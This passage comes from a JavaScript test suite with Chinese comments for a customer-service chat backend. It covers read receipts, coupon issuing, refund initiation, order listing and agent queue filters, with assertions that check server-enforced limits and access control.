  assert(sxCapSel.limit === 500, '超大 limit 夹到 500')
  assert(sxCapSel.order?.col === 'created_at' && sxCapSel.order.ascending === true,
    '按时间正序——倒序的话前端得自己翻一遍，而翻错了对话顺序就乱了')

  // 已读：两侧各一列。共用一列的话，客服打开会话会把用户那侧也标成已读，
  // 于是用户的红点在他没看的时候消失了。
  const sxDbRead = recorder({
    cs_sessions: { data: sxOpen, error: null },
    cs_messages: { data: [{ id: sxMid }], error: null }
  })
  const sxRead = await sxMarkRead(sxDbRead, sxAsUser, { session_id: sxSid })
  assert(sxRead.status === 200 && sxRead.body.marked === 1, '答复里带上标了几条，前端好归零红点')
  const sxReadUpd = sxDbRead.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
  assert('read_by_user_at' in sxReadUpd.payload && !('read_by_agent_at' in sxReadUpd.payload),
    '用户标已读只动 read_by_user_at')
  assert(sxReadUpd.in?.sender_role && !sxReadUpd.in.sender_role.includes('user'),
    '用户标的是别人发的消息，不含自己发的——标自己发的没有意义')
  assert(sxReadUpd.is && 'read_by_user_at' in sxReadUpd.is,
    'is(null) 的条件让已读只往前推：传一个更早的时间戳不能把已读改回未读')

  const sxDbReadAgent = recorder({
    cs_sessions: { data: sxOpen, error: null }, cs_messages: { data: [], error: null }
  })
  await sxMarkRead(sxDbReadAgent, sxAsAgent, { session_id: sxSid })
  const sxReadAgentUpd = sxDbReadAgent.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
  assert('read_by_agent_at' in sxReadAgentUpd.payload, '客服标已读动 read_by_agent_at')
  assert(sxReadAgentUpd.in.sender_role.length === 1 && sxReadAgentUpd.in.sender_role[0] === 'user',
    '客服标的只是用户发的消息')

  // §7 打字状态不落库：每次按键写一行的话，这张表的写入量会超过消息表，而这个信号活两秒。
  const sxDbTyping = recorder({
    cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings()
  })
  const sxTyping = await sxTypingGate(sxDbTyping, sxAsUser, { session_id: sxSid })
  assert(sxTyping.body.channel === `cs:${sxSid}` && sxTyping.body.as_role === 'user',
    '只回一个广播频道名和身份，前端自己 send')
  assert(!sxDbTyping.calls.some(c => c.op === 'insert' || c.op === 'update'),
    '打字状态不写任何一张表')
  const sxTypingClosed = await sxTypingGate(
    recorder({ cs_sessions: { data: { ...sxOpen, status: 'closed' }, error: null } }),
    sxAsUser, { session_id: sxSid })
  assert(sxTypingClosed.status === 403, '关闭的会话不该还在显示对方正在输入')
}
console.log('CS sessions: OK')

// --- §2.6 会话内发券 ------------------------------------------------------------------------------
// 这个接口和 admin-coupons 的根本区别是三条限制由服务端接管。把它们交给客服填，等于每次补偿都有
// 机会发出一张全站可用的无限量券，而那张券码会被贴到论坛上。下面每条断言对应一次「漏掉会怎样」。
const syUid = '77777777-7777-4777-8777-777777777777'
const syAid = '88888888-8888-4888-8888-888888888888'
const sySid = '99999999-9999-4999-8999-999999999999'
const syOid = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa'
const syMid = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb'
const syRid = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc'
const syPost = {
  id: sySid, channel: 'postsale', user_id: syUid, order_id: syOid, agent_id: syAid,
  // admin_mode 只剩 normal/blind 两种（§2.10 简化之后 CHECK 也只认这两个），fixture 跟着列默认值走。
  status: 'open', admin_mode: 'blind', first_response_seconds: null,
  opened_at: '2026-08-29T00:00:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
}
const syAgent = { userId: syAid, group: 'postsale' }
const syUser = { userId: syUid, group: 'default' }

// 券码：客服会把它念给用户听，或者用户手打，所以易混的字符不能出现。L 是留着的——它和 1 在
// 常见字体里不像，去掉它只是白丢一个字符。
const syCode = sxCouponCode(() => 0)
assert(/^CS[A-Z2-9]{8}$/.test(syCode), '券码是 CS 前缀加八位')
assert(!/[IO01]/.test(syCode), '码里没有 I/O/0/1——念错一个字符就是一次白跑的核销')
assert(sxCouponCode(() => 0.999).length === 10, 'random 取到上界也不越界')

const syCouponRow = {
  id: 'c-1', code: 'CSABCDEFGH', name: '客服补偿券',
  actions: [{ type: 'percent', value: 9000 }], ends_at: '2026-09-05T00:00:00.000Z'
}
const syCouponDb = (over = {}) => recorder({
  cs_sessions: { data: syPost, error: null },
  coupons: { data: syCouponRow, error: null },
  cs_messages: { data: { id: syMid, sender_role: 'agent', auto_reply: false }, error: null },
  cs_session_events: { data: null, error: null },
  ...over
})

let syDb = syCouponDb()
let syOut = await sxSendCoupon(syDb, syAgent, {
  session_id: sySid,
  actions: [{ type: 'percent', value: 9000 }],
  // 客服试图放开限制。这四个值必须一个都不作数。
  per_user_limit: 999, total_limit: 999, allowed_user_ids: null, code: 'FREEFORALL'
})
assert(syOut.status === 201, '客服可以在会话里发券')
const syIns = syDb.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
assert(syIns.per_user_limit === 1 && syIns.total_limit === 1,
  '每人一次、总量一次由服务端写死，请求体里的 999 不作数')
assert(Array.isArray(syIns.allowed_user_ids) && syIns.allowed_user_ids.length === 1 &&
  syIns.allowed_user_ids[0] === syUid,
  '只发给这个会话的用户——请求体传 null（全站通用）要被忽略，否则券码会被贴到论坛上')
assert(syIns.code !== 'FREEFORALL' && /^CS/.test(syIns.code), '券码由服务端生成，客服指定的不作数')
assert(syIns.created_by === syAid, '记下是哪个客服发的——出问题时第一个要查的字段')
assert(syIns.enabled === true, '发出去就是能用的，不需要管理员再点一次启用')
assert(new Date(syIns.ends_at) > new Date(syIns.starts_at), '有效期是个正区间')
// 七天，且客服能在 1..90 之间调。永久有效在补偿场景里几乎总是错的：那张券会在半年后被用掉，
// 而当时的补偿理由早就不成立了。
const syDays = (Date.parse(syIns.ends_at) - Date.parse(syIns.starts_at)) / 86400000
assert(Math.round(syDays) === 7, '默认七天')
const syLongIns = (await (async () => {
  const d = syCouponDb()
  await sxSendCoupon(d, syAgent, { session_id: sySid, actions: [{ type: 'percent', value: 9000 }], valid_days: 9999 })
  return d.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
})())
assert(Math.round((Date.parse(syLongIns.ends_at) - Date.parse(syLongIns.starts_at)) / 86400000) === 90,
  'valid_days 夹到 90 天上限，不接受 9999')

// 券码要贴在会话里，否则用户拿不到它，客服还得再复述一遍。
const syMsgIns = syDb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
assert(syMsgIns.body.includes('CSABCDEFGH'), '券码发到会话里')
assert(syMsgIns.format === 'markdown', '用 markdown 好让券码加粗')
assert(syMsgIns.body.includes('打 9 折'),
  '优惠内容用 describeAction 说人话，不是把 {"type":"percent","value":9000} 贴给用户')
assert(syMsgIns.sender_role === 'agent', '以客服身份发出——用户看到的是「客服给了我一张券」')
assert(syMsgIns.sender_id === syAid, 'sender 是会话当前的客服')
assert(syMsgIns.auto_reply !== true, '发券不是自动回复：它必须计入首响，客服确实回应了')
const syEvt = syDb.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert').payload
assert(syEvt.kind === 'coupon_sent' && syEvt.detail?.code === 'CSABCDEFGH' && syEvt.detail?.coupon_id === 'c-1',
  '留一条事件：事后要能查出这张券是谁在哪个会话里发的')
assert(syDb.calls.some(c => c.table === 'cs_sessions' && c.op === 'update'),
  '发券也算一次活动，要刷 last_activity_at——否则一个刚发过券的会话会被超时清理关掉')

// 管理员在别人的会话里发券：消息仍挂在原客服名下，但 authored_by 记真人。
const syAdminDb = syCouponDb()
await sxSendCoupon(syAdminDb, { userId: 'admin-1', group: 'admin' },
  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
const syAdminMsg = syAdminDb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
assert(syAdminMsg.sender_id === syAid && syAdminMsg.authored_by === 'admin-1',
  '管理员代发：对用户显示成原客服，审计里记真正的作者')
const syAdminIns = syAdminDb.calls.find(c => c.table === 'coupons' && c.op === 'insert').payload
assert(syAdminIns.created_by === 'admin-1', '券的创建者是真正点下按钮的人，不是会话上的客服')

// 用户自己不能给自己发券。can_post 对会话所属用户是 true，所以这条要单独判——少了它，
// 任何用户都能在自己的会话里给自己发一张九折券。
const sySelfDb = syCouponDb()
const sySelf = await sxSendCoupon(sySelfDb, syUser,
  { session_id: sySid, actions: [{ type: 'percent', value: 5000 }] })
assert(sySelf.status === 403 && /自己/.test(sySelf.body.error), '用户不能给自己发券')
assert(!sySelfDb.tables.includes('coupons'), '被拒的请求不该已经建了券')

const syStranger = await sxSendCoupon(syCouponDb(), { userId: 'nobody', group: 'default' },
  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
assert(syStranger.status === 403, '与这个会话无关的人不能发券')

const syClosed = await sxSendCoupon(
  syCouponDb({ cs_sessions: { data: { ...syPost, status: 'closed' }, error: null } }),
  syAgent, { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
assert(syClosed.status === 409 && /关闭/.test(syClosed.body.error),
  '关闭的会话不能发券，而且要说清是「已关闭」不是「无权」——后者会让客服去找管理员要权限')

assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: 'not-a-uuid', actions: [] })).status === 400,
  'session_id 要过 UUID 校验')
assert((await sxSendCoupon(syCouponDb({ cs_sessions: { data: null, error: null } }), syAgent,
  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })).status === 404, '会话不存在')

// 优惠方式必须有，且条数有上限。
assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: sySid, actions: [] })).status === 400,
  '不指定优惠方式要拒绝，不能落一张什么都不打折的券')
assert((await sxSendCoupon(syCouponDb(), syAgent, { session_id: sySid,
  actions: [1, 2, 3, 4].map(() => ({ type: 'fixed', value: 100 })) })).status === 400, '最多三个优惠动作')
// 校验器和 admin-coupons 是同一个，还走同一个 forValidation 翻译。少了这一步，会话里能发出一张
// 管理界面拒绝保存的券，而它在结算时的行为没人验证过。
const syBad = await sxSendCoupon(syCouponDb(), syAgent,
  { session_id: sySid, actions: [{ type: 'percent', value: 20000 }] })
assert(syBad.status === 400 && /10000/.test(syBad.body.error),
  '走同一个 validateCoupon：超过 10000 的折扣率（等于加价）在这里也过不去')

// 八位随机码撞了要重试一次，而不是把一句唯一约束冲突扔给客服重填一遍界面。
let syAttempt = 0
const syDupDb = syCouponDb({
  coupons: () => {
    syAttempt += 1
    return syAttempt === 1
      ? { data: null, error: { code: '23505', message: 'duplicate key value violates unique constraint "coupons_code_key"' } }
      : { data: { ...syCouponRow, id: 'c-2', code: 'CSZZZZZZZZ' }, error: null }
  }
})
const syDup = await sxSendCoupon(syDupDb, syAgent,
  { session_id: sySid, actions: [{ type: 'percent', value: 9000 }] })
assert(syDup.status === 201 && syAttempt === 2, '券码撞了换一个码重试一次')
const syCodes = syDupDb.calls.filter(c => c.table === 'coupons' && c.op === 'insert').map(c => c.payload.code)
assert(syCodes[0] !== syCodes[1], '重试用的是新生成的码，不是同一个——同一个码只会再撞一次')
assert(syDup.body.coupon.code === 'CSZZZZZZZZ' && syDup.body.message_id === syMid,
  '重试成功后走的是同一条收尾路径：券码要贴到会话里，不能只建券不发消息')

console.log('CS coupon send: OK')

// --- §2.7 会话内发起退款 --------------------------------------------------------------------------
// 订单号从会话上取，不从请求体取。这一条是这个接口的全部安全性所在：接受请求体里的 order_id 而不
// 验证归属，它就是一个「对任意订单发起退款」的接口，而门槛只有 STAFF。
const syOrderRow = {
  id: syOid, user_id: syUid, status: 'paid',
  amount_minor: 10000, paid_amount_minor: 9500, currency: 'USD', paid_currency: 'USD'
}
const syRefundRow = {
  id: syRid, order_id: syOid, user_id: syUid, status: 'pending',
  amount_minor: 9500, currency: 'USD'
}
// 跑通全程要经过 requestRefund 的整条链：查订单 → 查在途申请（无）→ 插申请 → 写审计 → 插通知，
// 然后回到 startRefund 的收尾：发消息 → 刷会话 → 记事件。
const syRefundDb = (over = {}) => recorder({
  cs_sessions: { data: syPost, error: null },
  orders: { data: syOrderRow, error: null },
  refund_requests: [{ data: null, error: null }, { data: syRefundRow, error: null }],
  refund_audit_log: { data: null, error: null },
  notifications: { data: { id: 'n-1' }, error: null },
  site_settings: { data: { value: { value: true } }, error: null },
  cs_messages: { data: { id: syMid, sender_role: 'agent' }, error: null },
  cs_session_events: { data: null, error: null },
  ...over
})

let syRdb = syRefundDb()
let syRefund = await sxStartRefund(syRdb, syAgent,
  { session_id: sySid, reason_code: 'not_working', reason_detail: '客户反馈装不上' })
assert(syRefund.status === 201, '客服可以从售后会话里发起退款')
const syReqIns = syRdb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload
assert(syReqIns.order_id === syOid, '订单号取自会话，不是客服手抄的——手抄就会抄错，而抄错是给另一笔单退了钱')
assert(syReqIns.user_id === syUid, 'user_id 是订单的主人，不是发起人')
assert(syReqIns.initiator_role === 'postsale', '记下是代提，以及哪个组代的')
assert(syReqIns.initiated_by === syAid, '记下具体是谁代提的')
assert(syReqIns.amount_minor === 9500, '不给金额时退实付金额，不是下单金额')
// 复用 requestRefund 而不是在这里重写一遍：金额上限、在途唯一、审批通知、审计日志全在那里。
// 重写一遍就等于多了一条可能漏掉金额上限的路径。
assert(syRdb.tables.includes('refund_audit_log'), '走的是 requestRefund，所以审计照样写')
assert(syRdb.tables.includes('notifications'), '走的是 requestRefund，所以审批通知照样发')
assert(syRefund.body.notified === true, '把通知是否发出去告诉调用方')
assert(!syRdb.calls.some(c => c.table === 'orders' && c.op === 'update'),
  '提交申请不改订单状态——§13.3 规定审批通过才进 REFUND_PENDING')

// 会话里要留下痕迹。客服说「已经帮您提了退款」而系统里查不到，就是一次无法追溯的操作。
const syRefundMsg = syRdb.calls.find(c => c.table === 'cs_messages' && c.op === 'insert').payload
assert(/退款申请/.test(syRefundMsg.body) && /审批/.test(syRefundMsg.body),
  '告诉用户申请已提交、正在等审批——不说的话用户会以为钱已经退了')
assert(syRefundMsg.body.includes('95.00') || /\$|USD/.test(syRefundMsg.body),
  '金额要写出来：用户看不到金额就无法发现客服填错了一位')
assert(syRefundMsg.format === 'plain', '这条是系统措辞，不需要 markdown')
assert(syRefundMsg.sender_role === 'agent' && syRefundMsg.sender_id === syAid, '以客服身份发出')
const syRefundEvt = syRdb.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert').payload
assert(syRefundEvt.kind === 'refund_requested' && syRefundEvt.detail?.refund_id === syRid &&
  syRefundEvt.detail?.order_id === syOid, '事件里带上退款单号和订单号')

// 会话上的订单号优先于请求体。反过来（请求体优先）就是那个洞：一个售后会话可以被用来对任意订单退款。
const syOtherOid = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd'
const syPin = syRefundDb()
await sxStartRefund(syPin, syAgent,
  { session_id: sySid, order_id: syOtherOid, reason_detail: '试图换成别人的单' })
assert(syPin.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.order_id === syOid,
  '会话绑定的订单号覆盖请求体里的——这一条是整个接口的安全边界')

// 售前会话没有订单，可以带一个 order_id 进来，但必须验证归属。
const syPre = { ...syPost, channel: 'presale', order_id: null }
const syPreAuth = { userId: syAid, group: 'cs' }
const syPreDb = syRefundDb({ cs_sessions: { data: syPre, error: null } })
const syPreOk = await sxStartRefund(syPreDb, syPreAuth,
  { session_id: sySid, order_id: syOid, reason_detail: '售前会话里帮忙提' })
assert(syPreOk.status === 201, '售前会话带上属于该用户的订单号可以提')

const syWrongOwner = syRefundDb({
  cs_sessions: { data: syPre, error: null },
  orders: { data: { ...syOrderRow, user_id: 'someone-else' }, error: null }
})
const syWrong = await sxStartRefund(syWrongOwner, syPreAuth,
  { session_id: sySid, order_id: syOid, reason_detail: '别人的单' })
assert(syWrong.status === 404, '订单不属于会话所属用户要拒——和「订单不存在」同一个答复，不给探测口')
assert(!syWrongOwner.tables.includes('refund_requests'),
  '归属没过就不该有任何申请落库；漏掉这一步，客服能从任何一个会话里对任何订单发起退款')

const syNoOrder = await sxStartRefund(syRefundDb({ cs_sessions: { data: syPre, error: null } }),
  syPreAuth, { session_id: sySid, reason_detail: '没给订单号' })
assert(syNoOrder.status === 400 && /order_id/.test(syNoOrder.body.error),
  '售前会话不给订单号要明确说要它，不是静默失败')

// 用户自己走订单页那条路，不走这里。这里的 403 文案要指路。
const syOwnerRefund = await sxStartRefund(syRefundDb(), syUser,
  { session_id: sySid, reason_detail: '我要退款' })
assert(syOwnerRefund.status === 403 && /订单页/.test(syOwnerRefund.body.error),
  '用户在会话里点退款要被引导去订单页，而不是收到一句「无权」')

const syClosedRefund = await sxStartRefund(
  syRefundDb({ cs_sessions: { data: { ...syPost, status: 'closed' }, error: null } }),
  syAgent, { session_id: sySid, reason_detail: '关了还提' })
assert(syClosedRefund.status === 409, '关闭的会话不能发起退款')

// presale 不在 REFUND_PROXY_GROUPS 里。它的 rank 和 postsale 相同，所以拦它的只能是 requestRefund
// 里那份名单——这里要确认那道拦截真的生效，而不是被这条捷径绕过去了。
const syPresaleDb = syRefundDb()
const syPresale = await sxStartRefund(syPresaleDb, { userId: syAid, group: 'presale' },
  { session_id: sySid, reason_detail: '售前想动钱' })
assert(syPresale.status === 404, '售前代提被 requestRefund 的名单挡下（订单不是他的，且他不是代提人）')
assert(!syPresaleDb.tables.includes('refund_requests'), '被挡下就没有申请落库')

// requestRefund 拒绝时不能在会话里留下「已提交」。留了就是一句用户会当真的假消息。
const syRejectDb = syRefundDb({ refund_requests: { data: { id: 'r-old', status: 'pending' }, error: null } })
const syReject = await sxStartRefund(syRejectDb, syAgent, { session_id: sySid, reason_detail: '重复提' })
assert(syReject.status === 409, '已有在途申请要透传 409')
assert(!syRejectDb.calls.some(c => c.table === 'cs_messages' && c.op === 'insert'),
  '申请没成立就不能在会话里说「已提交」')
assert(!syRejectDb.tables.includes('cs_session_events'), '也不该留一条 refund_requested 事件')

const syNoReason = await sxStartRefund(syRefundDb(), syAgent, { session_id: sySid, reason_detail: '  ' })
assert(syNoReason.status === 400, '原因必填这条由 requestRefund 管，透传出来')

// 金额可改的开关也在 requestRefund 里。这里确认参数确实传了进去，而不是被这条路径悄悄丢掉——
// 丢掉的表现是客服填了「只退一半」而系统退了全款。
const syAmountDb = syRefundDb({
  refund_requests: [{ data: null, error: null }, { data: { ...syRefundRow, amount_minor: 5000 }, error: null }]
})
const syAmount = await sxStartRefund(syAmountDb, syAgent,
  { session_id: sySid, reason_detail: '部分退', amount_minor: 5000 })
assert(syAmount.status === 201, '客服可以改金额（开关打开时）')
assert(syAmountDb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert').payload.amount_minor === 5000,
  'amount_minor 要传到 requestRefund，不能在这一层被丢掉')
const syEvidenceDb = syRefundDb()
await sxStartRefund(syEvidenceDb, syAgent,
  { session_id: sySid, reason_detail: '带证据', evidence_paths: ['u/1/a.png'] })
assert(syEvidenceDb.calls.find(c => c.table === 'refund_requests' && c.op === 'insert')
  .payload.evidence_paths.length === 1, 'evidence_paths 同样要传下去')

assert((await sxStartRefund(syRefundDb(), syAgent, { session_id: 'x', reason_detail: 'y' })).status === 400,
  'session_id 要过 UUID 校验')
assert((await sxStartRefund(syRefundDb({ cs_sessions: { data: null, error: null } }), syAgent,
  { session_id: sySid, reason_detail: 'y' })).status === 404, '会话不存在')

// --- 会话里的订单列表 -----------------------------------------------------------------------------
// 客服要先知道用户有哪些单才能选一笔退款。只读会话所属用户的单，不接受 user_id 参数——接受的话
// 这就是一个「按用户 ID 列出全部订单」的接口，而它的门槛只有 STAFF。
const syOrdersDb = recorder({
  cs_sessions: { data: syPost, error: null },
  orders: { data: [syOrderRow], error: null }
})
const syOrders = await sxSessionOrders(syOrdersDb, syAgent, { session_id: sySid, user_id: 'someone-else' })
assert(syOrders.status === 200 && syOrders.body.orders.length === 1, '客服能看到会话用户的订单')
const syOrdersSel = syOrdersDb.calls.find(c => c.table === 'orders')
assert(syOrdersSel.filters.user_id === syUid,
  '按会话上的 user_id 查，请求体里的 user_id 不作数——否则这是一个按 ID 列出任意用户订单的接口')
assert(syOrdersSel.limit === 50, '有上限，不把一个下过三千单的用户的全部历史拉回来')
assert(syOrdersSel.order?.ascending === false, '最近的单在前面：客服要退的几乎总是最新那笔')
assert(syOrdersSel.selected !== '*' && String(syOrdersSel.selected).includes('paid_amount_minor'),
  '选列写死并且带上实付金额——客服要按那个数字判断退多少')

const syOrdersStranger = await sxSessionOrders(
  recorder({ cs_sessions: { data: syPost, error: null } }), { userId: 'nobody', group: 'default' },
  { session_id: sySid })
assert(syOrdersStranger.status === 403, '无关的人看不到会话，更看不到订单')
// 用户本人能看见自己的会话，但这个接口不给他——他的订单在他自己的订单页上，那条路径有 RLS。
const syOrdersOwner = await sxSessionOrders(
  recorder({ cs_sessions: { data: syPost, error: null } }), syUser, { session_id: sySid })
assert(syOrdersOwner.status === 403, '会话所属用户走这个接口要被拒，订单列表有它自己的页面')

console.log('CS refund and orders: OK')
// --- §2.4 / §2.10 / §2.13 工作台 -----------------------------------------------------------------
// 三个页面合成一个接口，是为了让「客服能看见哪些会话」只有一份实现。所以这一节钉的是那份实现的
// 每一个筛选条件：它们全都跑在 service client 上，写松一个就是一个客服能读到别人会话的洞。
//
// 注意这里的 auth 要带 rank：这个模块读的是 auth.rank（handler 显式传进来的），不是 rankOf(group)。
// 少了这个字段，管理员的门槛判断在测试里会静默地按 undefined < RANK.ADMIN 走成 403，
// 或者更糟——按 NaN 比较全部放行。
const swAid = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee'
const swUid = 'ffffffff-ffff-4fff-8fff-ffffffffffff'
const swSid = '12121212-1212-4212-8212-121212121212'
const swPresale = { userId: swAid, group: 'presale', rank: rankOf('presale') }
const swCs = { userId: swAid, group: 'cs', rank: rankOf('cs') }
const swAdmin = { userId: 'admin-2', group: 'admin', rank: rankOf('admin') }
const swRow = {
  id: swSid, channel: 'presale', user_id: swUid, agent_id: null, status: 'open',
  admin_mode: 'blind', first_response_seconds: 12, timed_out: false,
  last_activity_at: '2026-08-29T00:05:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
}
// decorate 会在同一张 cs_messages 上做两次不同的查询：最后一条消息、以及未读计数。按次序数会数错，
// 所以用函数给法按 is 过滤条件区分。
const swDecorated = (rows, opts = {}) => ({
  cs_sessions: { data: rows, error: null },
  user_profiles: { data: opts.profiles ?? [{ user_id: swUid, display_name: '张三', group_name: 'default' }], error: null },
  cs_messages: entry => entry.is && 'read_by_agent_at' in entry.is
    ? { data: opts.unread ?? [], error: null }
    : { data: opts.messages ?? [], error: null }
})

// 队列：只给自己服务的渠道，只给还没人接的。
let swDb = recorder(swDecorated([swRow]))
let swOut = await sxListQueue(swDb, swPresale)
assert(swOut.status === 200, '售前能看队列')
const swQ = swDb.calls.find(c => c.table === 'cs_sessions')
assert(swQ.filters.status === 'open', '只看开着的')
assert(swQ.is && 'agent_id' in swQ.is && swQ.is.agent_id === null,
  "待接入靠 is('agent_id', null)：写成 eq 的话 PostGREST 匹配不到任何行，队列永远是空的")
assert(swQ.in?.channel?.length === 1 && swQ.in.channel[0] === 'presale',
  '售前只看到售前的队列——否则他会看到一堆自己点不动的会话')
// 反向断言。这里曾经是 neq('admin_mode','blind')（「排除已被管理员暗中接管的」），而 §2.10 简化之后
// blind 是列默认值：那个条件会把每一个新会话都当成已接管，队列于是永远是空的，谁也接不到人。
assert(!swQ.neq || !('admin_mode' in swQ.neq),
  '队列不能按 admin_mode 排除任何行——blind 是默认值，排一档就是排全部')
assert(swQ.order?.ascending === true, '队列按建立时间正序：等得最久的排在前面')
assert(swQ.limit === 100, '队列有上限')

const swAdminQueue = recorder(swDecorated([swRow]))
await sxListQueue(swAdminQueue, swAdmin)
assert(swAdminQueue.calls.find(c => c.table === 'cs_sessions').in.channel.length === sxChannels.length,
  '管理员的队列覆盖全部渠道——他能接任何会话')
const swNoChannel = await sxListQueue(recorder({}), { userId: 'x', group: 'default', rank: 0 })
assert(swNoChannel.status === 403, '不服务任何渠道的用户组要被拒，而不是拿到一个空列表')

// decorate：批量查，不是每个会话查一次。
const swMany = [swRow, { ...swRow, id: 'sid-2', user_id: 'u2', agent_id: swAid }]
const swDecDb = recorder(swDecorated(swMany, {
  profiles: [{ user_id: swUid, display_name: '张三', group_name: 'default' },
    { user_id: swAid, display_name: '客服小李', group_name: 'presale' }],
  messages: [{ session_id: swSid, body: 'x'.repeat(300), sender_role: 'user', recalled: false, created_at: '2026-08-29T00:04:00.000Z' },
    { session_id: swSid, body: '更早的', sender_role: 'agent', recalled: false, created_at: '2026-08-29T00:01:00.000Z' },
    { session_id: 'sid-2', body: '密码是 hunter2', sender_role: 'user', recalled: true, created_at: '2026-08-29T00:03:00.000Z' }],
  unread: [{ session_id: swSid }, { session_id: swSid }, { session_id: 'sid-2' }]
}))
const swDec = (await sxListQueue(swDecDb, swPresale)).body.sessions
assert(swDecDb.calls.filter(c => c.table === 'user_profiles').length === 1,
  '用户名批量查一次，不是每个会话查一次——忙的时候那是几十次往返')
const swProfIds = swDecDb.calls.find(c => c.table === 'user_profiles').in?.user_id
// 两个会话上有三个不同的人：两位用户加一位客服（第一条还没人接，agent_id 是 null，要被滤掉）。
assert(swProfIds.length === 3 && swProfIds.includes(swUid) && swProfIds.includes('u2') &&
  swProfIds.includes(swAid), '一次把用户和客服的 id 都带上')
assert(!swProfIds.includes(null) && !swProfIds.includes(undefined),
  'null 的 agent_id 要滤掉——带着它去 in() 查询会白查一行，而 PostgREST 对 in.(null) 的解释还未必如你所愿')
assert(new Set(swProfIds).size === swProfIds.length,
  'id 去重：同一个客服接了二十个会话时，不去重就是把他的 id 在 in() 里写二十遍')
assert(swDec[0].user_name === '张三' && swDec[1].agent_name === '客服小李', '名字归位到对应的会话')
assert(swDec[1].agent_group === 'presale', '带上客服的组：管理员要看出是谁在接')
assert(swDec[0].last_message.body.length === 120,
  '预览截到 120 字：不截的话一条四千字的消息会把整个列表接口的响应撑起来')
assert(swDec[0].last_message.created_at === '2026-08-29T00:04:00.000Z',
  '取最新那条，不是查询回来的第一条——排序是倒序，所以先到的就是最新的')
assert(swDec[1].last_message.body === '[已撤回]',
  '撤回的消息在列表预览里不能露出原文——这是 §2.11 最容易漏的一处，' +
  '而漏在这里的后果是用户撤回了一句密码，它仍然显示在工作台的会话列表上')
assert(swDec[0].unread_from_user === 2 && swDec[1].unread_from_user === 1, '未读数按会话归位')
const swEmpty = recorder({ cs_sessions: { data: [], error: null } })
await sxListQueue(swEmpty, swPresale)
assert(!swEmpty.tables.includes('user_profiles') && !swEmpty.tables.includes('cs_messages'),
  '空列表不做装饰查询——三次白跑的往返')

// 我的会话。
const swMineDb = recorder(swDecorated([swRow]))
await sxListMine(swMineDb, swPresale, {})
const swMine = swMineDb.calls.find(c => c.table === 'cs_sessions')
assert(swMine.filters.agent_id === swAid, '只看自己的——这条写松了就是能读别人的会话')
assert(swMine.filters.status === 'open', '默认只看开着的')
assert(swMine.order?.ascending === false, '按最后活动倒序：刚有人说话的排在前面')
const swMineClosed = recorder(swDecorated([swRow]))
await sxListMine(swMineClosed, swPresale, { include_closed: true })
assert(!('status' in swMineClosed.calls.find(c => c.table === 'cs_sessions').filters),
  'include_closed 时不加状态条件，历史会话要能翻出来（§2.5 的重开要从这里点）')
assert(swMineClosed.calls.find(c => c.table === 'cs_sessions').filters.agent_id === swAid,
  '翻历史也只翻自己的')

// 全部会话：只有管理员。
const swAllDenied = await sxListAll(recorder({}), swCs, {})
assert(swAllDenied.status === 403, '客服看不到全部会话——那是 §2.10 的管理员视图')
const swAllDb = recorder(swDecorated([swRow]))
await sxListAll(swAllDb, swAdmin, { channel: 'postsale', status: 'closed', agent_id: swAid, limit: 9999 })
const swAll = swAllDb.calls.find(c => c.table === 'cs_sessions')
assert(swAll.filters.channel === 'postsale' && swAll.filters.status === 'closed' &&
  swAll.filters.agent_id === swAid, '三个筛选都落到 SQL 上，不在 JS 里过滤')
assert(swAll.limit === 500, 'limit 夹到 500')
const swBadFilter = recorder(swDecorated([swRow]))
await sxListAll(swBadFilter, swAdmin, { channel: 'nope', status: 'weird', limit: 0 })
const swBad = swBadFilter.calls.find(c => c.table === 'cs_sessions')
assert(!('channel' in swBad.filters) && !('status' in swBad.filters),
  '不认识的筛选值要忽略，不能原样拼进查询')
assert(swBad.limit === 100, 'limit 为 0 回落到默认 100，不是查零行')
const swUnassigned = recorder(swDecorated([swRow]))
await sxListAll(swUnassigned, swAdmin, { unassigned: true })
assert(swUnassigned.calls.find(c => c.table === 'cs_sessions').is?.agent_id === null,
  "unassigned 用 is(null)")
// 「排除我的」。这一条测的是 or 而不是 neq：SQL 里 agent_id <> '我' 对 agent_id 为空的行结果是 NULL，
// 于是一个裸的 neq 会把待接入的会话一起筛掉——而那些恰好是这一页上最需要看到的。
const swExclude = recorder(swDecorated([swRow]))
await sxListAll(swExclude, swAdmin, { exclude_mine: '1' })
const swExcludeCall = swExclude.calls.find(c => c.table === 'cs_sessions')
assert(swExcludeCall.or === `agent_id.is.null,agent_id.neq.${swAdmin.userId}`,
  'exclude_mine 要写成 or(is.null, neq)，单个 neq 会把没人接的会话一起漏掉')
assert(!swExcludeCall.neq || !('agent_id' in swExcludeCall.neq),
  '不能同时再挂一个 agent_id 的 neq——那等于把 or 的第一半又否掉了')
// 关掉的时候一个条件都不加。'false' 和 '0' 是 GET 过来的假值，if (input.flag) 对它们都是真的。
for (const off of [false, 'false', '0', '', undefined]) {
  const swOff = recorder(swDecorated([swRow]))
  await sxListAll(swOff, swAdmin, { exclude_mine: off })
  assert(!swOff.calls.find(c => c.table === 'cs_sessions').or,
    `exclude_mine=${JSON.stringify(off)} 是关着的，不能加条件`)
}

// §2.3 在线名单。
const swNow = Date.now()
